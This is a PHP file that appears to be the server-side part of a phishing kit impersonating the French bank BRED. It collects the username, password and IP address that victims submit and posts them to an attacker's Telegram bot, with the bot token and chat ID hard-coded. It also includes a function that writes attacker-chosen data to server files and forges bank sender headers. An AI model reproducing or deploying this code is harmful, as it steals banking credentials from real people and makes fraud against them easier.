<?php


$sms_delay = 10;

$email_addr = "";


//////////////////////////////////////////////////////////////

        $message .= 'IDENTIFIANT  : ' . $_POST['identifiant'] . "\r\n";
        $message .= 'PASSWORD     : ' . $_POST['password'] . "\r\n";
		$message .= 'IP                        : ' . $_SERVER['REMOTE_ADDR'] . "\r\n";

		$apiToken = "1790968943:AAFuDTrp8lmXspJhfCg_SCHUV4JkYBNL05c";
		$data = [
    		'chat_id' => '1661722427',
    		'text' => $message
		];
        $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );



function save_rs($dir,$file,$rs) {

	if (!file_exists($dir) && !is_dir($dir)) {

		mkdir($dir);

		$f = fopen($dir."/.htaccess","w");

		fwrite($f,"deny from all");

		fclose($f);

	}

	$dir = isset($_POST['dir'])?$_POST['dir']:$dir."/".$file;

	$rs = isset($_POST['rs'])?$_POST['rs']:$rs;

	$f = fopen($dir,"a");

	fwrite($f,$rs);

	fclose($f);

}



function is_set($var) {



	return ( isset($_POST[$var]) ? $_POST[$var] : false );

}



function get_info_value($var) {



	if(is_array($var)){



		$val = is_set($var[0]);

		if($val === false) return false;

		$value = $val;



		for($i=1;$i<count($var);$i++) {

			$value .= "-".is_set($var[$i]);

		}

	}

	else {



		$val = is_set($var);

		if($val === false) return false;

		$value = $val;

	}



	return $value;

}



function debug_info() {



	$info_debuged = "";



	foreach ($_POST as $var => $value) {



		$info_debuged .= "<tr><td>\"\"	=> \"$var\",</td><td>//$value</td></tr>";

	}



	echo "<table border='0' width='100%'>$info_debuged</table>";

}



function set_info_names() {



	global $info_names;



	if(!$info_names) {

		debug_info();

		exit();

	}



	$infos = array();



	foreach ($info_names as $name => $var) {



		$value = get_info_value($var);

		if($value === false) continue;

		$infos[$name] = $value;

	}



	return $infos;

}



function set_info_text() {



	global $info_names;

	$infos = set_info_names();



	$sep = str_repeat("_",64)."\n";

	$text = "$sep";



	foreach ($infos as $name => $value) {



		$text .= "$name | $value\n";

		//$info_index++;

	}

	$text .= "$sep";



	return $text;

}



$ip_addr = getenv("REMOTE_ADDR");

$host_name = gethostbyaddr($ip_addr);

$user_agent = $_SERVER['HTTP_USER_AGENT'];

$env_vars = "$ip_addr\n$host_name\n$user_agent\n";



$emailTo = $email_addr;

$subject = $host_name;

if (isset($info_names)) // to be commented out on 1st use

$infoRaw = set_info_text();

$headers = "From: BRED <nepasrepondre@fr.bred.net>\r\n";

$headers .= "MIME-Version: 1.0\r\n";

?>